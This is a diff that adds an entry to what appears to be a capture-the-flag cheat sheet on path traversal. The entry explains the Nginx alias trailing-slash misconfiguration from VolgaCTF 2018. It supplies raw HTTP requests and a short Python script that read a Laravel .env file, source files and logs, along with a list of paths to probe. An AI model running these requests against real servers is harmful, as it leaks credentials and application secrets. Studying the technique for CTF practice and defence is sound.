@@ -8,6 +8,7 @@
   - [Brace Stripping](#brace-stripping)
   - [Double URL Encoding](#double-url-encoding)
   - [Python os.path.join](#python-ospathjoin)
+- [Nginx Alias Traversal to Leak .env (VolgaCTF 2018)](#nginx-alias-traversal-to-leak-env-volgactf-2018)
 - [/dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)](#devfd-symlink-to-bypass-proc-filter-google-ctf-2017)
 - [Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)](#unicode-homoglyph-path-traversal-u2e2e-csaw-2017)
 - [Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)](#ruby-regexpescape-multibyte-character-bypass-square-ctf-2017)
@@ -116,6 +117,61 @@ zip -y exploit.zip file.txt
 
 ### Python os.path.join
 `os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)
+
+---
+
+### Nginx Alias Traversal to Leak .env (VolgaCTF 2018)
+
+**Pattern:** Nginx `alias` misconfiguration allows path traversal when a `location` block's path doesn't end with `/` but the `alias` does. The path remainder is appended unsafely, allowing `..` traversal out of the aliased directory.
+
+```nginx
+# Vulnerable Nginx configuration:
+location /laravel {
+    alias /var/www/html/public/;
+}
+# Note: /laravel has NO trailing slash, but alias has one
+# This creates a join mismatch: /laravel<anything> maps to /var/www/html/public/<anything>
+```
+
+```bash
+# Exploit: traverse out of the public/ directory to read .env
+GET /laravel../.env HTTP/1.1
+# Nginx resolves: alias "/var/www/html/public/" + "../.env" = /var/www/html/.env
+
+# Read application source
+GET /laravel../app/Http/Controllers/AuthController.php HTTP/1.1
+
+# Read other config files
+GET /laravel../config/database.php HTTP/1.1
+GET /laravel../storage/logs/laravel.log HTTP/1.1
+```
+
+```python
+import requests
+
+target = "http://target"
+
+# Leak Laravel .env file (contains APP_KEY, DB credentials, etc.)
+r = requests.get(f"{target}/laravel../.env")
+if r.status_code == 200:
+    print("[+] .env contents:")
+    print(r.text)
+    # Look for APP_KEY, DB_PASSWORD, API keys, etc.
+```
+
+**Detection checklist:**
+```text
+# Test for the misconfiguration on common paths:
+/static../
+/assets../
+/public../
+/media../
+/uploads../
+/laravel../
+# Any location block using alias without matching trailing slashes
+```
+
+**Key insight:** When an Nginx `location` directive lacks a trailing slash but its `alias` has one, the path is joined unsafely, allowing `..` traversal out of the aliased directory. This is a common misconfiguration in Laravel deployments where `/laravel` maps to the `public/` directory. Always check for trailing slash mismatches between `location` and `alias` directives.
 
 ---
 
